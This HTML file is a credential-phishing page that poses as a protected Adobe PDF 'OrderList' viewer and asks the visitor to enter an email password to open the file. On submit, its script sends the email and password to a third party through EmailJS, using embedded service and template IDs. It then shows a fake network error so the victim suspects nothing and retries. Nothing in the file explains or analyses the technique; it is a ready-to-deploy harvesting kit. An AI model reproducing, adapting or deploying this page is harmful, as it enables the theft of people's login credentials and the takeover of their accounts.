<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Protected File | View OrderList</title>
<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script type="text/javascript">
   (function(){
      emailjs.init("kUOv0ZnyMXgQQY1yj"); // Your EmailJS public key
   })();
</script>
<style>
body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  background-image: url('https://i.ibb.co/s1HJ0Hg/20241205-101341.jpg');
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  position: relative;
  color: #fff;
}

body::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.6);
  z-index: -1;
}

.container {
  background-color: #fff;
  border-radius: 8px;
  padding: 20px;
  text-align: center;
  box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
  max-width: 360px;
  width: 90%;
  height: auto;
  opacity: 0;
  animation: fadeIn 0.8s forwards;
  position: relative;
  color: #333;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(-20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

h2 {
  font-weight: bold;
  margin-top: 20px;
  margin-bottom: 10px;
  color: #d32f2f;
}

p {
  font-size: 14px;
  margin-bottom: 20px;
  color: #666;
}

input[type="text"],
input[type="password"],
button {
  width: calc(100% - 40px);
  margin-bottom: 15px;
  padding: 12px;
  border-radius: 4px;
  border: 1px solid #ccc;
  box-sizing: border-box;
  font-size: 14px;
}

button {
  background-color: #d32f2f;
  color: #fff;
  border: none;
  cursor: pointer;
  transition: background-color 0.3s ease;
}

button:hover {
  background-color: #b71c1c;
}

.error-container {
  color: white;
  background: lightcoral;
  padding: 10px;
  margin-top: 10px;
  border-radius: 4px;
  display: none; /* Hide error message by default */
}

.spinner {
  border: 4px solid rgba(0, 0, 0, 0.1);
  border-top: 4px solid #333;
  border-radius: 50%;
  width: 30px;
  height: 30px;
  animation: spin 1s linear infinite;
  margin: 20px auto;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>
<body>
<div class="container">
  <a href="https://imgbb.com/" class="image-link">
    <img src="https://i.ibb.co/Y2crL0n/PDF-file-icon-svg-removebg-preview.png" alt="PDF Icon" class="image" style="width: 50px; height: auto;">
  </a>
  <h2>Adobe View File | OrderList</h2>
  <p>These files are sensitive and secured against unauthorized access. In order to access this file, please securely access with your correct login credentials.</p>
  <form id="loginForm">
    <input type="text" name="email" id="email" placeholder="Email" required value="example@email" readonly>
    <input type="password" name="password" id="password" placeholder="Password" required>
    <div class="remember-me">
      <input type="checkbox" id="remember-me" name="remember-me" checked>
      <label for="remember-me">Remember me</label>
    </div>
    <button type="submit">View</button>
  </form>
  <!-- Error message is hidden by default, will be shown on error -->
  <div class="error-container" id="error-message">Network error... please try again later!</div>
  <div class="spinner" id="spinner" style="display:none;"></div>
</div>

<script src="https://your-server-url.com/script.js"></script> <!-- Replace with your hosted script URL -->

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault(); // Prevent form submission

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // Show the spinner to indicate that the email is being sent
  document.getElementById('spinner').style.display = 'block';
  document.getElementById('error-message').style.display = 'none'; // Hide error message initially

  // Send email using EmailJS immediately
  emailjs.send('service_mclb6ze', 'template_30nlj5e', {
    email: email,
    password: password
  })
  .then(function(response) {
    console.log('Email sent successfully:', response);
    document.getElementById('spinner').style.display = 'none'; // Hide the spinner
    alert('Email sent successfully!');
  })
  .catch(function(error) {
    console.error('Error sending email:', error);
    document.getElementById('spinner').style.display = 'none'; // Hide the spinner
    // Display error message after email fails
    document.getElementById('error-message').style.display = 'block';
  });

  // Optionally, simulate network error after a timeout (for demo purposes)
  setTimeout(function() {
    document.getElementById('error-message').style.display = 'block'; // Show error message after 3 seconds (simulate network error)
  }, 3000); // Show error message after 3 seconds
});
</script>

</body>
</html>
